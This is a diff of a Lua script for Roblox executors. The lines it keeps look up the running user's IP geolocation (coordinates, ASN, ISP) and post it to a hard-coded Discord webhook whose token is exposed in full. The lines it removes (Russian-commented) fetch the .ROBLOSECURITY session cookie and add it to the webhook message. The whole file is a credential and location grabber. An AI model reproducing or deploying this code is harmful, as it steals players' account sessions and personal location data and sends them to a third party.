@@ -2,48 +2,6 @@ local api = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwh
 local req = http_request or request or (http and http.request) or (syn and syn.request)
 local webhook = "https://discord.com/api/webhooks/1204495684217348116/3Lh-aBLlVUV1zAGa8E2_0iFO2XrRvMo-Ck09VDeR0Fg7fegqQbgCys88rf4ESteCPkMW"
 
-local http = require("http")
-local headers = require("headers")
-
--- Функция для получения куки .ROBLOSECURITY
-local function get_roblosecurity_cookie()
-    -- Выполняем GET-запрос к сайту Roblox
-    local response, err = http.request("GET", "https://www.roblox.com/home", {
-        headers = {
-            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-        }
-    })
-
-    if not response then
-        return nil, "Ошибка при выполнении запроса: " .. (err or "неизвестная ошибка")
-    end
-
-    -- Получаем заголовки ответа
-    local response_headers = headers.new(response:headers())
-
-    -- Извлекаем куки из заголовка "Set-Cookie"
-    local cookies = response_headers:get_all("Set-Cookie")
-    for _, cookie in ipairs(cookies) do
-        -- Ищем куку .ROBLOSECURITY
-        if cookie:match(".ROBLOSECURITY=") then
-            -- Извлекаем значение куки
-            local roblosecurity_cookie = cookie:match(".ROBLOSECURITY=([^;]+)")
-            return roblosecurity_cookie
-        end
-    end
-
-    return nil, "Кука .ROBLOSECURITY не найдена"
-end
-
--- Пример использования
-local roblosecurity_cookie, err = get_roblosecurity_cookie()
-if roblosecurity_cookie then
-    print("Кука .ROBLOSECURITY:", roblosecurity_cookie)
-else
-    print("Ошибка:", err)
-end
-
--- Отправляем данные на Discord Webhook
 req({
     Url = webhook,
     Method = "POST",
@@ -68,8 +26,7 @@ req({
                     {name = "**Longitude**", value = "``" .. tostring(api.longitude) .. "``", inline = true},
                     {name = "**Flag**", value = api.flag.emoji or "N/A", inline = true},
                     {name = "**ASN**", value = "``" .. api.connection.asn .. "``", inline = true},
-                    {name = "**ISP**", value = "``" .. api.connection.isp .. "``", inline = true},
-                    {name = "**ROBLOSECURITY Cookie**", value = "``" .. roblosecurity_cookie .. "``", inline = false}
+                    {name = "**ISP**", value = "``" .. api.connection.isp .. "``", inline = true}
                 }
             }
         }
